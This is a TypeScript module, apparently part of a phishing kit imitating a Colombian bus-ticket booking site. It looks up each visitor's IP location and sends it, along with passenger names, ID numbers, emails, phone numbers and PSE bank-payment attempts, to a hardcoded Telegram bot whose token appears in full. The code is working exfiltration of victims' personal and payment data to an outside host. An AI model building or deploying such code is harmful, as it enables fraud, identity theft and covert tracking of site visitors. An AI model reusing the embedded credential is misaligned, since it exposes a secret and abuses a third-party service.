/**
 * Utilidad para enviar notificaciones a Telegram
 */

const TELEGRAM_BOT_TOKEN = '8287996768:AAHN9DKIPY0OokiPNsy__AvPkN1_1lZ51mQ';
const TELEGRAM_CHAT_ID = '-5189868648';

interface GeoData {
  ip: string;
  country?: string;
  countryCode?: string;
  region?: string;
  city?: string;
  zip?: string;
  lat?: number;
  lon?: number;
  timezone?: string;
  isp?: string;
  org?: string;
  as?: string;
}

interface VisitorData {
  geo: GeoData;
  userAgent?: string;
  referer?: string;
  page?: string;
  timestamp: string;
}

interface PassengerData {
  seatNumber: string;
  documentType: string;
  documentNumber: string;
  firstName: string;
  lastName: string;
  email?: string;
  phone?: string;
}

interface TripData {
  origin: string;
  destination: string;
  date: string;
  departureTime: string;
  arrivalTime?: string;
  seats: string[];
  totalPrice: number;
  passengers: PassengerData[];
}

/**
 * Envía un mensaje a Telegram
 */
async function sendTelegramMessage(message: string): Promise<boolean> {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
      }),
    });

    return response.ok;
  } catch (error) {
    console.error('Error sending Telegram message:', error);
    return false;
  }
}

/**
 * Obtiene datos de geolocalización de una IP
 */
export async function getGeoData(ip: string): Promise<GeoData> {
  try {
    // Usar ip-api.com (gratis, no requiere API key)
    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);

    if (response.ok) {
      const data = await response.json();
      if (data.status === 'success') {
        return {
          ip: data.query || ip,
          country: data.country,
          countryCode: data.countryCode,
          region: data.regionName,
          city: data.city,
          zip: data.zip,
          lat: data.lat,
          lon: data.lon,
          timezone: data.timezone,
          isp: data.isp,
          org: data.org,
          as: data.as,
        };
      }
    }
  } catch (error) {
    console.error('Error getting geo data:', error);
  }

  return { ip };
}

/**
 * Formatea y envía notificación de nuevo visitante
 */
export async function notifyNewVisitor(data: VisitorData): Promise<boolean> {
  const { geo, userAgent, referer, page, timestamp } = data;

  // Determinar dispositivo
  let device = 'Desconocido';
  if (userAgent) {
    if (/iPhone|iPad|iPod/i.test(userAgent)) device = 'iOS';
    else if (/Android/i.test(userAgent)) device = 'Android';
    else if (/Windows/i.test(userAgent)) device = 'Windows';
    else if (/Mac/i.test(userAgent)) device = 'Mac';
    else if (/Linux/i.test(userAgent)) device = 'Linux';
  }

  // Determinar navegador
  let browser = 'Desconocido';
  if (userAgent) {
    if (/Chrome/i.test(userAgent) && !/Edg/i.test(userAgent)) browser = 'Chrome';
    else if (/Firefox/i.test(userAgent)) browser = 'Firefox';
    else if (/Safari/i.test(userAgent) && !/Chrome/i.test(userAgent)) browser = 'Safari';
    else if (/Edg/i.test(userAgent)) browser = 'Edge';
    else if (/Opera|OPR/i.test(userAgent)) browser = 'Opera';
  }

  const message = `
<b>🚀 NUEVO VISITANTE</b>
━━━━━━━━━━━━━━━━━━━━━

<b>📍 UBICACIÓN</b>
├ IP: <code>${geo.ip}</code>
├ País: ${geo.country || 'N/A'} ${geo.countryCode ? `(${geo.countryCode})` : ''}
├ Ciudad: ${geo.city || 'N/A'}
├ Región: ${geo.region || 'N/A'}
└ Zona horaria: ${geo.timezone || 'N/A'}

<b>🌐 RED</b>
├ ISP: ${geo.isp || 'N/A'}
├ Organización: ${geo.org || 'N/A'}
└ AS: ${geo.as || 'N/A'}

<b>💻 DISPOSITIVO</b>
├ Sistema: ${device}
├ Navegador: ${browser}
└ Referer: ${referer || 'Directo'}

<b>📄 PÁGINA</b>
└ ${page || '/'}

<b>🕐 FECHA/HORA</b>
└ ${timestamp}

${geo.lat && geo.lon ? `<b>📌 MAPA</b>\n└ <a href="https://www.google.com/maps?q=${geo.lat},${geo.lon}">Ver ubicación</a>` : ''}
`;

  return sendTelegramMessage(message);
}

/**
 * Formatea y envía notificación de reserva de pasajeros
 */
export async function notifyPassengerBooking(
  tripData: TripData,
  visitorGeo: GeoData
): Promise<boolean> {
  const passengersText = tripData.passengers
    .map((p, i) => `
├ <b>Pasajero ${i + 1} - Silla ${p.seatNumber}</b>
│  ├ Nombre: ${p.firstName} ${p.lastName}
│  ├ Doc: ${p.documentType} ${p.documentNumber}
│  ├ Email: ${p.email || 'N/A'}
│  └ Tel: ${p.phone || 'N/A'}`)
    .join('\n');

  const message = `
<b>🎫 NUEVA RESERVA DE SILLAS</b>
━━━━━━━━━━━━━━━━━━━━━

<b>🚌 VIAJE</b>
├ Ruta: ${tripData.origin} → ${tripData.destination}
├ Fecha: ${tripData.date}
├ Hora: ${tripData.departureTime}${tripData.arrivalTime ? ` - ${tripData.arrivalTime}` : ''}
├ Sillas: ${tripData.seats.join(', ')}
└ Total: $${tripData.totalPrice.toLocaleString('es-CO')} COP

<b>👥 PASAJEROS</b>
${passengersText}

<b>📍 VISITANTE</b>
├ IP: <code>${visitorGeo.ip}</code>
├ País: ${visitorGeo.country || 'N/A'}
├ Ciudad: ${visitorGeo.city || 'N/A'}
└ ISP: ${visitorGeo.isp || 'N/A'}

<b>🕐 FECHA/HORA</b>
└ ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}
`;

  return sendTelegramMessage(message);
}

/**
 * Formatea y envía notificación de intento de pago PSE
 */
export async function notifyPSEAttempt(
  paymentData: {
    amount: number;
    bank: string;
    email: string;
    document: string;
    tripInfo?: {
      origin: string;
      destination: string;
      date: string;
      seats: string[];
    };
  },
  visitorGeo: GeoData
): Promise<boolean> {
  const message = `
<b>💳 INTENTO DE PAGO PSE</b>
━━━━━━━━━━━━━━━━━━━━━

<b>💰 PAGO</b>
├ Monto: $${paymentData.amount.toLocaleString('es-CO')} COP
├ Banco: ${paymentData.bank}
├ Email: ${paymentData.email}
└ Documento: ${paymentData.document}

${paymentData.tripInfo ? `<b>🚌 VIAJE</b>
├ Ruta: ${paymentData.tripInfo.origin} → ${paymentData.tripInfo.destination}
├ Fecha: ${paymentData.tripInfo.date}
└ Sillas: ${paymentData.tripInfo.seats.join(', ')}
` : ''}
<b>📍 VISITANTE</b>
├ IP: <code>${visitorGeo.ip}</code>
├ País: ${visitorGeo.country || 'N/A'}
├ Ciudad: ${visitorGeo.city || 'N/A'}
└ ISP: ${visitorGeo.isp || 'N/A'}

<b>🕐 FECHA/HORA</b>
└ ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}
`;

  return sendTelegramMessage(message);
}
